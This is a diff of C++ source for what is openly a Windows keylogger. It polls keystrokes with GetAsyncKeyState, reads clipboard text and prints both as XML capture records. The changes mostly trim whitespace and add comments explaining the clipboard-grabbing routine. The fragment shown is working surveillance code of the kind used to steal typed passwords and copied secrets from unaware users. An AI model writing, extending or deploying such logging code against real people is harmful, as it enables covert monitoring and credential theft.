@@ -142,7 +142,7 @@ FORCEINLINE int GrabKey(int VkPrimary,char Primary, char Secondary, int LastKeyS
                {
                    /*
                         reset timer two to the current clock.
-                        IMPORTANT for if statement to function 
+                        IMPORTANT for if statement to function
                     */
                    Timer2=clock();
                    /*
@@ -185,7 +185,7 @@ FORCEINLINE int GrabFuncKey(char FunctionKey, char* StrOut,int LastKeyStrokeLogg
     if (GetAsyncKeyState(FunctionKey)!=AsyncKeyStateTest_0 and GetAsyncKeyState(FunctionKey)!=AsyncKeyStateTest_1 and gotchar )
         {
             /*
-                set the global flag to indicate that a character has been 
+                set the global flag to indicate that a character has been
                 retrieved from the buffer.
             */
             gotchar=false;
@@ -230,7 +230,7 @@ FORCEINLINE int GrabFuncKey(char FunctionKey, char* StrOut,int LastKeyStrokeLogg
                 {
                     /*
                         reset timer two to the current clock.
-                        IMPORTANT for if statement to function 
+                        IMPORTANT for if statement to function
                     */
                     Timer2=clock();
                    /*
@@ -251,36 +251,79 @@ FORCEINLINE int GrabFuncKey(char FunctionKey, char* StrOut,int LastKeyStrokeLogg
 
 FORCEINLINE int grabclipboard()
 {
-    if (OpenClipboard(NULL)) 
+    /*
+        attempt to open the clipboard,
+        if that fails it is likely that the clipboard is locked
+        by another program or by the operating system, check the
+        clipboard again next iteration.
+    */
+    if (OpenClipboard(NULL))
         {
+            /*
+                declare a buffer to hold clipboard data temporarily
+                while it is being verified.
+            */
             char* this_cb_data;
+            /*
+                grab a handle to the clip board, and specify the CF_TEXT,
+                as to not grab data that will crash the program.
+            */
             HANDLE cb_lock_handle = GetClipboardData(CF_TEXT);
+            /*
+                if the handle is invalid then close the clipboard
+            */
             if(cb_lock_handle)
                 {
-                this_cb_data=(char*)GlobalLock(cb_lock_handle);
-                if(!strlen(this_cb_data))
-                {
-
-                    GlobalUnlock(cb_lock_handle);
-                    CloseClipboard();
-                    return 0;
-                }
-                if ( last_cb_data == NULL || (strncmp(last_cb_data,this_cb_data,strlen(this_cb_data)-1)))
-                {
-                    if(last_cb_data == NULL)
-                        last_cb_data = (char*)malloc(strlen(this_cb_data)+1);
-                    else
-                        last_cb_data = (char*)realloc(last_cb_data,strlen(this_cb_data)+1);
+                    /*
+                        lock the clipboard, this is important, if the
+                        clipboard is not locked then the data may become corrupted.
+                    */
+                    this_cb_data=(char*)GlobalLock(cb_lock_handle);
+                    /*
+                        if their is nothing in the clipboard, then unlock and close
+                        the clipboard. exit this function with status 0,
+                    */
+                    if(!strlen(this_cb_data))
+                    {
+                        GlobalUnlock(cb_lock_handle);
+                        CloseClipboard();
+                        return 0;
+                    }
+                    /*
+                        first check that last_cb_data  has been set, if not then continue processing the cb data,
+                        then do a string comparison between the last cb_data and this cb_data, if their different,
+                        then continue processing the cb_data.
+                    */
+                    if ( last_cb_data == NULL || (strncmp(last_cb_data,this_cb_data,strlen(this_cb_data)-1)))
+                    {
+                        /*
+                            if last_cb_data has not yet been set allocate memory for the data, else
+                                resize the allocated memory for the cb_data coming in.
+                        */
+                        if(last_cb_data == NULL)
+                            last_cb_data = (char*)malloc(strlen(this_cb_data)+1);
+                        else
+                            last_cb_data = (char*)realloc(last_cb_data,strlen(this_cb_data)+1);
+                        /*
+                            copy the recently logged clip board data over to the last_cb_data buffer.
+                        */
                         strncpy(last_cb_data,this_cb_data,strlen(this_cb_data));
-                    cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>ClipBoard</CaptureType>"<<
-                    "\n\t\t\t\t<Capture>"<<(char*)this_cb_data<<"</Capture>\n\t\t\t</logged>\n\t\t\t<logged>"<<
-                    "\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[" ;
-                }
-                GlobalUnlock(cb_lock_handle);
+
+                        /*
+                            print all the necessary meta data for the clipboard
+                                NOTE:L, a sanitizer function for the xml still has to be written.
+                        */
+                        cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>ClipBoard</CaptureType>"<<
+                        "\n\t\t\t\t<Capture>"<<(char*)this_cb_data<<"</Capture>\n\t\t\t</logged>\n\t\t\t<logged>"<<
+                        "\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[" ;
+                    }
+                    /*
+                        unlock the clipboard. so that other programs waiting in que to access the
+                        clipboard can access it.
+                    */
+                    GlobalUnlock(cb_lock_handle);
                 }
             CloseClipboard();
-
-
         }
     return 0;
 }
